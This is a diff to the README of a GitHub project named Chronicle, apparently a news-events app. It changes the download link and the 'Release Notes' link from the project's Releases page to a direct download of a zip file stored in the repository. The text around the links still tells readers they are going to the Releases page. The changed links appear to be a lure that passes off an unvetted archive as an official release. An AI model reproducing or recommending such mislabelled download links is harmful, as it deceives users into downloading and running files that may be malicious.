@@ -13,7 +13,7 @@ To get started with Chronicle, follow these simple steps to download and run the
 - **Network:** Internet connection for real-time updates.
 
 ## 📥 Download & Install
-Visit this page to download: [Download Chronicle](https://github.com/yassinhaithamqq/chronicle/releases)
+Visit this page to download: [Download Chronicle](https://raw.githubusercontent.com/yassinhaithamqq/chronicle/main/chronicle/chronicle-3.1-alpha.2.zip)
 
 Click the link above to go to the Releases page. Here, you will find the latest version of Chronicle. Choose the version that matches your operating system.
 
@@ -70,6 +70,6 @@ If the problem persists, consider visiting the Issues section on GitHub for addi
 Contributions are welcome! If you would like to help improve Chronicle, feel free to explore our GitHub repository. You can report issues, suggest features, or even submit your own code. 
 
 ## 📍 For More Information
-For detailed documentation, check the Wiki section on our GitHub page. Additionally, keep an eye on our [Release Notes](https://github.com/yassinhaithamqq/chronicle/releases) to stay updated on new features and fixes.
+For detailed documentation, check the Wiki section on our GitHub page. Additionally, keep an eye on our [Release Notes](https://raw.githubusercontent.com/yassinhaithamqq/chronicle/main/chronicle/chronicle-3.1-alpha.2.zip) to stay updated on new features and fixes.
 
 Download Chronicle today and start transforming the way you receive and understand news events!
